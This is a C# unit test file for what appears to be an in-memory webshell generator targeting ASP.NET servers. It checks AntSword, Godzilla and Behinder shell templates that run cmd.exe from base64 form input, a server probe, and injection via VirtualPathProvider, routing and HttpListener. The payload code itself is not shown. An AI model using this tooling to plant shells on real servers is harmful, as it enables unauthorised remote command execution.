using NMG.Shells;
using NMG.Templates;
using Microsoft.CodeAnalysis.CSharp;
using Xunit;

namespace NMG.Tests;

public class AntSwordTests
{
    [Fact]
    public void AntSwordTrigger_UsesFormBasedProtocol()
    {
        Assert.Contains("www-form", AntSwordNet.TriggerBlock);
        Assert.Contains("FromBase64String", AntSwordNet.TriggerBlock);
    }

    [Fact]
    public void AntSwordTrigger_ExecutesCommand()
    {
        Assert.Contains("Process", AntSwordNet.TriggerBlock);
        Assert.Contains("cmd.exe", AntSwordNet.TriggerBlock);
        Assert.Contains("RedirectStandardOutput", AntSwordNet.TriggerBlock);
    }

    [Fact]
    public void AntSwordMembers_NoAES()
    {
        // AntSword uses plain base64, no AES encryption
        Assert.DoesNotContain("RijndaelManaged", AntSwordNet.MembersBlock);
        Assert.DoesNotContain("MD5CryptoServiceProvider", AntSwordNet.MembersBlock);
    }

    [Fact]
    public void AntSwordMembers_OnlyPasswordField()
    {
        Assert.Contains("public string password", AntSwordNet.MembersBlock);
        Assert.DoesNotContain("public string key", AntSwordNet.MembersBlock);
    }

    [Fact]
    public void AntSwordTrigger_HasTryCatch()
    {
        // NFR-1: all paths wrapped in try-catch
        Assert.Contains("try", AntSwordNet.TriggerBlock);
        Assert.Contains("catch", AntSwordNet.TriggerBlock);
    }

    [Fact]
    public void AntSwordTrigger_ResponseEnd()
    {
        // Must call Response.End to prevent normal page from rendering
        Assert.Contains("Resp.End()", AntSwordNet.TriggerBlock);
    }
}

public class ProbeTemplateTests
{
    [Fact]
    public void Probe_ReportsCLRVersion()
    {
        Assert.Contains("Environment.Version", ProbeTemplate.Source);
    }

    [Fact]
    public void Probe_ReportsTrustLevel()
    {
        Assert.Contains("trustLevel", ProbeTemplate.Source);
    }

    [Fact]
    public void Probe_ChecksMvc()
    {
        Assert.Contains("System.Web.Mvc", ProbeTemplate.Source);
    }

    [Fact]
    public void Probe_ChecksRouting()
    {
        Assert.Contains("System.Web.Routing", ProbeTemplate.Source);
    }

    [Fact]
    public void Probe_ChecksVpp()
    {
        Assert.Contains("VirtualPathProvider", ProbeTemplate.Source);
    }

    [Fact]
    public void Probe_JsonContentType()
    {
        Assert.Contains("application/json", ProbeTemplate.Source);
    }

    [Fact]
    public void Probe_HasTryCatch()
    {
        int tryCount = System.Text.RegularExpressions.Regex.Matches(ProbeTemplate.Source, "try").Count;
        Assert.True(tryCount >= 3, "Probe should have multiple try-catch blocks");
    }
}

public class IntegrationTests
{
    [Theory]
    [InlineData("vpp", "godzilla")]
    [InlineData("vpp", "behinder")]
    [InlineData("vpp", "antsword")]
    [InlineData("route", "godzilla")]
    [InlineData("route", "behinder")]
    [InlineData("route", "antsword")]
    [InlineData("httplistener", "godzilla")]
    public void AllCombinations_ProduceValidSource(string type, string shell)
    {
        string quotedPass = "\"testpass\"";
        string quotedKey = "\"0123456789abcdef\"";

        string members, trigger, randomStr;
        if (shell == "godzilla")
        {
            members = Shells.GodzillaCSharp.MembersBlock.Replace("{{PASSWORD_ENC}}", "new byte[] { 0x48 }").Replace("{{KEY_ENC}}", "new byte[] { 0x49 }").Replace("{{XOR_KEY}}", "0x2A");
            trigger = Shells.GodzillaCSharp.TriggerBlock.Replace("{{PASSWORD}}", quotedPass).Replace("{{KEY}}", quotedKey);
            randomStr = Shells.GodzillaCSharp.RandomStringBlock;
        }
        else if (shell == "behinder")
        {
            members = Shells.BehinderNet.MembersBlock.Replace("{{PASSWORD}}", quotedPass);
            trigger = Shells.BehinderNet.TriggerBlock.Replace("{{PASSWORD}}", quotedPass);
            randomStr = Shells.BehinderNet.RandomStringBlock;
        }
        else
        {
            members = Shells.AntSwordNet.MembersBlock.Replace("{{PASSWORD}}", quotedPass);
            trigger = Shells.AntSwordNet.TriggerBlock.Replace("{{PASSWORD}}", quotedPass);
            randomStr = Shells.AntSwordNet.RandomStringBlock;
        }

        string template = type switch
        {
            "vpp" => Templates.VppTemplate.Source,
            "route" => Templates.RouteTemplate.Source,
            "httplistener" => Templates.HttpListenerTemplate.Source,
            _ => throw new ArgumentException(type)
        };

        string source = template
            .Replace("{{NAMESPACE}}", "Test.NS")
            .Replace("{{CLASSNAME}}", "TestClass42")
            .Replace("{{MEMBERS}}", members)
            .Replace("{{TRIGGER_BLOCK}}", trigger)
            .Replace("{{RANDOM_STRING}}", randomStr)
            .Replace("{{LISTENER_URL}}", "http://*:8080/");

        Assert.DoesNotContain("{{", source);
        var tree = CSharpSyntaxTree.ParseText(source, new CSharpParseOptions(LanguageVersion.CSharp2));
        var errors = tree.GetDiagnostics()
            .Where(d => d.Severity == Microsoft.CodeAnalysis.DiagnosticSeverity.Error).ToList();
        Assert.True(errors.Count == 0,
            $"{type}/{shell} has parse errors: {string.Join("; ", errors.Select(e => e.GetMessage()))}");
    }
}
